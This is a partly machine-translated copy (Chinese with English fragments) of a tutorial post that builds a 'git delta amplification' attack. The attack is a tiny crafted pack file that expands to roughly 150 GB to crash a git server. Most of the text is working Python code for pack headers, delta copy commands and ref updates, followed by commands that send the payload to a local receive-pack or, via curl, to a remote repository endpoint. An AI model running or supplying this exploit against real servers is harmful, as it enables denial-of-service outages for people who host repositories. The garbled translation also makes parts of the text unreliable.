<html>
<head>
<title>Git delta amplification</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Git delta扩增</h1>
<blockquote>原文：<a href="https://medium.com/hackernoon/git-delta-amplification-4c55b70e5cf0?source=collection_archive---------21-----------------------#2017-10-30">https://medium.com/hackernoon/git-delta-amplification-4c55b70e5cf0?source=collection_archive---------21-----------------------#2017-10-30</a></blockquote><div><div class="ef hi hj hk hl hm"/><div class="hn ho hp hq hr"><div class=""/><p id="9258" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">git协议的一个有趣的方面是delta对象。它们允许从一个对象复制粘贴内容来创建一个新的对象。让我们使用增量创建一个巨大的对象，并尝试摧毁一个git服务器！</p><h1 id="3ce5" class="jp jq hu bd jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km dt translated">这个计划</h1><p id="7fea" class="pw-post-body-paragraph ir is hu it b iu kn iw ix iy ko ja jb jc kp je jf jg kq ji jj jk kr jm jn jo hn dt translated">我们可以复制粘贴的最大字节数是16711680字节(255 &lt;&lt; 16), so we’ll use a blob of this size and paste it a few thousand times. Just for fun we’ll actually start with a blob of 255 bytes and work our way up.</p><h1 id="0ead" class="jp jq hu bd jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km dt translated">The git protocol</h1><p id="b451" class="pw-post-body-paragraph ir is hu it b iu kn iw ix iy ko ja jb jc kp je jf jg kq ji jj jk kr jm jn jo hn dt translated">But first things first, we need to learn the git protocol. The command responsible for receiving objects is <strong class="it hv"> receive-pack </strong>，它首先期望的是一个引用更新列表。例如:</p><pre class="ks kt ku kv fq kw kx ky kz aw la dt"><span id="4181" class="lb jq hu kx b fv lc ld l le lf">&lt;OLD_SHA1&gt; &lt;NEW_SHA1&gt; refs/heads/master</span></pre><p id="a6a6" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">我们懒得去找一个有效的<em class="lg"> OLD_SHA1 </em>，所以我们将通过创建一个新的引用来绕过它。我们可以通过使用特殊的<em class="lg">零id </em>哈希:<strong class="it hv">00000000000000000000000000000000000</strong>来实现这一点。对于<em class="lg"> NEW_SHA1 </em>我们将只使用一个伪散列，比如说<strong class="it hv">111111111111111111111111111</strong>，因为我们希望git服务器在真正尝试验证这个散列之前崩溃。</p><p id="e427" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">最后，这些命令以pkt-line格式编码，增加了一个4字节长的十六进制前缀。所以，让我们看看目前为止我们有什么(我将使用Python 3作为代码示例)。</p><pre class="ks kt ku kv fq kw kx ky kz aw la dt"><span id="cb3b" class="lb jq hu kx b fv lc ld l le lf">zero_id = b'0' * 40</span><span id="e66e" class="lb jq hu kx b fv lh ld l le lf">fake_id = b'1' * 40</span><span id="22c8" class="lb jq hu kx b fv lh ld l le lf">create_ref = b'%s %s refs/heads/xxx\x00\n' % (zero_id, fake_id)</span><span id="d2e3" class="lb jq hu kx b fv lh ld l le lf">pkt_line = b'%04x%s' % (len(create_ref) + 4, create_ref)</span><span id="9990" class="lb jq hu kx b fv lh ld l le lf">sys.stdout.buffer.write(pkt_line)</span><span id="2949" class="lb jq hu kx b fv lh ld l le lf">sys.stdout.buffer.write(b'0000')</span></pre><h1 id="8be7" class="jp jq hu bd jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km dt translated">包裹</h1><p id="473f" class="pw-post-body-paragraph ir is hu it b iu kn iw ix iy ko ja jb jc kp je jf jg kq ji jj jk kr jm jn jo hn dt translated">接下来，我们需要开始打包我们要发送的对象。让我们从头部开始:12个字节，由ASCII中的“PACK”组成，后面是4个字节的版本号(总是2)和4个字节的跟随对象数(所有数字都是按网络字节顺序排列的)。根据我们的计划，我们将从一个大小为255的blob对象开始，用它来生成一个大小为65280的blob，用它来生成一个大小为16711680的blob，最后是我们的大blob，所以总共有4个对象。我们不会创建任何提交对象。</p><pre class="ks kt ku kv fq kw kx ky kz aw la dt"><span id="2d52" class="lb jq hu kx b fv lc ld l le lf">pack = bytearray()</span><span id="9643" class="lb jq hu kx b fv lh ld l le lf">pack += b'PACK' + struct.pack('!II', 2, 4)</span></pre><p id="df27" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">标题准备好了，让我们添加第一个blob。包中的每个对象都需要一个对象头来编码它的类型和大小。我们将使用的类型号是:blobs的<strong class="it hv"> 3 </strong>和deltas的<strong class="it hv"> 7 </strong>。</p><p id="626c" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">固定大小的字段太明显了，所以git使用自己的可变长度编码。让我们编写一个函数来实现这一点:</p><pre class="ks kt ku kv fq kw kx ky kz aw la dt"><span id="3361" class="lb jq hu kx b fv lc ld l le lf">def object_header(obj_type, obj_size):</span><span id="ec95" class="lb jq hu kx b fv lh ld l le lf">    header = bytearray()</span><span id="667d" class="lb jq hu kx b fv lh ld l le lf">    b = (obj_type &lt;&lt; 4) | (obj_size &amp; 15)</span><span id="7ec5" class="lb jq hu kx b fv lh ld l le lf">    obj_size &gt;&gt;= 4</span><span id="c3f9" class="lb jq hu kx b fv lh ld l le lf">    while obj_size &gt; 0:</span><span id="2013" class="lb jq hu kx b fv lh ld l le lf">        header.append(b | 0x80)</span><span id="2063" class="lb jq hu kx b fv lh ld l le lf">        b = obj_size &amp; 0x7f</span><span id="fbd9" class="lb jq hu kx b fv lh ld l le lf">        obj_size &gt;&gt;= 7</span><span id="c0b8" class="lb jq hu kx b fv lh ld l le lf">    header.append(b)</span><span id="0693" class="lb jq hu kx b fv lh ld l le lf">    return header</span></pre><p id="8ec6" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">我们终于准备好添加第一个斑点了！</p><pre class="ks kt ku kv fq kw kx ky kz aw la dt"><span id="acb9" class="lb jq hu kx b fv lc ld l le lf">size0 = 255</span><span id="4cfe" class="lb jq hu kx b fv lh ld l le lf">blob0 = os.urandom(size0)</span><span id="5e0b" class="lb jq hu kx b fv lh ld l le lf">pack += object_header(3, size0)</span><span id="0610" class="lb jq hu kx b fv lh ld l le lf">pack += zlib.compress(blob0)</span></pre><h1 id="233d" class="jp jq hu bd jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km dt translated">三角洲</h1><p id="2a5c" class="pw-post-body-paragraph ir is hu it b iu kn iw ix iy ko ja jb jc kp je jf jg kq ji jj jk kr jm jn jo hn dt translated">我们现在可以创建我们的第一个增量。对于大小为65280的新blob，我们将复制粘贴blob0 256次。增量格式非常简单:</p><pre class="ks kt ku kv fq kw kx ky kz aw la dt"><span id="8274" class="lb jq hu kx b fv lc ld l le lf">SRC_SIZE DST_SIZE [COMMANDS]</span></pre><p id="c20e" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">当然，大小也使用可变长度编码，所以让我们创建几个辅助函数:</p><pre class="ks kt ku kv fq kw kx ky kz aw la dt"><span id="1b73" class="lb jq hu kx b fv lc ld l le lf">def make_delta(src_size, dst_size, commands):</span><span id="cfe1" class="lb jq hu kx b fv lh ld l le lf">    return encode_size(src_size) + encode_size(dst_size) + commands</span><span id="d319" class="lb jq hu kx b fv lh ld l le lf">def encode_size(n):</span><span id="e388" class="lb jq hu kx b fv lh ld l le lf">    b = bytearray()</span><span id="f7de" class="lb jq hu kx b fv lh ld l le lf">    while n &gt; 0:</span><span id="44c7" class="lb jq hu kx b fv lh ld l le lf">        mod = n &amp; 0x7f</span><span id="7a4a" class="lb jq hu kx b fv lh ld l le lf">        n &gt;&gt;= 7</span><span id="2c42" class="lb jq hu kx b fv lh ld l le lf">        if n &gt; 0:</span><span id="4cc5" class="lb jq hu kx b fv lh ld l le lf">            b.append(0x80 | mod)</span><span id="2ca4" class="lb jq hu kx b fv lh ld l le lf">        else:</span><span id="429c" class="lb jq hu kx b fv lh ld l le lf">            b.append(mod)</span><span id="59cd" class="lb jq hu kx b fv lh ld l le lf">    return b</span></pre><p id="79c3" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">我们还需要指向带有20字节散列头的源对象，所以让我们添加一个函数来计算blob的id:</p><pre class="ks kt ku kv fq kw kx ky kz aw la dt"><span id="53e3" class="lb jq hu kx b fv lc ld l le lf">def blob_id(blob):</span><span id="faeb" class="lb jq hu kx b fv lh ld l le lf">    m = hashlib.sha1()</span><span id="0163" class="lb jq hu kx b fv lh ld l le lf">    m.update(b'blob %d\0' % len(blob))</span><span id="be0e" class="lb jq hu kx b fv lh ld l le lf">    m.update(blob)</span><span id="1bb5" class="lb jq hu kx b fv lh ld l le lf">    return m.digest()</span></pre><p id="5a4a" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">我们现在有了创建第一个delta对象的所有构件:</p><pre class="ks kt ku kv fq kw kx ky kz aw la dt"><span id="ca96" class="lb jq hu kx b fv lc ld l le lf">size1 = size0 * 256</span><span id="e192" class="lb jq hu kx b fv lh ld l le lf">cmd1 = bytes([0x80 | 0x10, 0xff]) * 256</span><span id="0bf7" class="lb jq hu kx b fv lh ld l le lf">delta1 = make_delta(size0, size1, cmd1)</span><span id="f99d" class="lb jq hu kx b fv lh ld l le lf">pack += object_header(7, len(delta1))</span><span id="81a6" class="lb jq hu kx b fv lh ld l le lf">pack += blob_id(blob0)     # source</span><span id="f15a" class="lb jq hu kx b fv lh ld l le lf">pack += zlib.compress(delta1)</span></pre><p id="bcb9" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">让我们来谈谈我们创建的命令。第一个字节定义了我们正在做什么样的操作。<strong class="it hv"> 0x80 </strong>表示我们要从源对象中复制。<strong class="it hv"> 0x10 </strong>表示后面的字节会说要复制多少字节。所以这2个字节实质上就是:复制255个字节。我们这样做了256次。</p><p id="2c12" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">好，让我们创建第二个增量:</p><pre class="ks kt ku kv fq kw kx ky kz aw la dt"><span id="2e84" class="lb jq hu kx b fv lc ld l le lf">size2 = size1 * 256</span><span id="ff12" class="lb jq hu kx b fv lh ld l le lf">cmd2 = bytes([0x80 | 0x20, 0xff]) * 256</span><span id="e64d" class="lb jq hu kx b fv lh ld l le lf">delta2 = make_delta(size1, size2, cmd2)</span><span id="3e70" class="lb jq hu kx b fv lh ld l le lf">pack += object_header(7, len(delta2))</span><span id="9fc0" class="lb jq hu kx b fv lh ld l le lf">pack += blob_id(blob0 * 256)    # source blob</span><span id="542d" class="lb jq hu kx b fv lh ld l le lf">pack += zlib.compress(delta2)</span></pre><p id="0fcf" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">注意这里我们是如何使用命令<strong class="it hv"> 0x20 </strong>的，这意味着接下来的字节将被乘以256，并被用作拷贝大小。所以我们的新命令翻译成:复制65280字节，256次。还要注意，对于源id，我们使用将由<strong class="it hv"> delta1 </strong>生成的blob。</p><p id="fdc8" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">delta2是我们最大的构建块，让我们用它来生成一个大约150 GB的blob。</p><pre class="ks kt ku kv fq kw kx ky kz aw la dt"><span id="2126" class="lb jq hu kx b fv lc ld l le lf">size3 = size2 * 10000</span><span id="b777" class="lb jq hu kx b fv lh ld l le lf">cmd3 = bytes([0x80 | 0x40, 0xff]) * 10000</span><span id="69ba" class="lb jq hu kx b fv lh ld l le lf">delta3 = make_delta(size2, size3, cmd3)</span><span id="63d5" class="lb jq hu kx b fv lh ld l le lf">pack += object_header(7, len(delta3))</span><span id="79dd" class="lb jq hu kx b fv lh ld l le lf">pack += blob_id(blob0 * 256 * 256)    # source blob</span><span id="2b72" class="lb jq hu kx b fv lh ld l le lf">pack += zlib.compress(delta3)</span></pre><p id="66da" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">这里我们使用命令<strong class="it hv"> 0x40 </strong>，它将下面的字节乘以65536，允许我们创建命令:复制16711680字节，10000次。</p><p id="2192" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">就这样，总的包大小是464字节，产生大约150 GB。您可以运行:</p><pre class="ks kt ku kv fq kw kx ky kz aw la dt"><span id="7671" class="lb jq hu kx b fv lc ld l le lf">./amplify.py | git receive-pack /path/to/repo.git</span></pre><p id="843e" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">或者尝试使用远程回购:</p><pre class="ks kt ku kv fq kw kx ky kz aw la dt"><span id="acac" class="lb jq hu kx b fv lc ld l le lf">./amplify.py | curl -v -X POST — data-binary @- -H ‘Content-Type: application/x-git-receive-pack-request’ <a class="ae li" href="https://host/path/repo.git/git-receive-pack" rel="noopener ugc nofollow" target="_blank">https://host/path/repo.git/git-receive-pack</a></span></pre><p id="8631" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">下面是最终来源:<a class="ae li" href="https://gist.github.com/verigak/bda113dc5850d2cb30c9b3c5f83c8141" rel="noopener ugc nofollow" target="_blank">https://gist . github . com/verigak/BDA 113 DC 5850d 2c B3 0 c 9 B3 C5 f 83 c 8141</a></p></div></div>    
</body>
</html>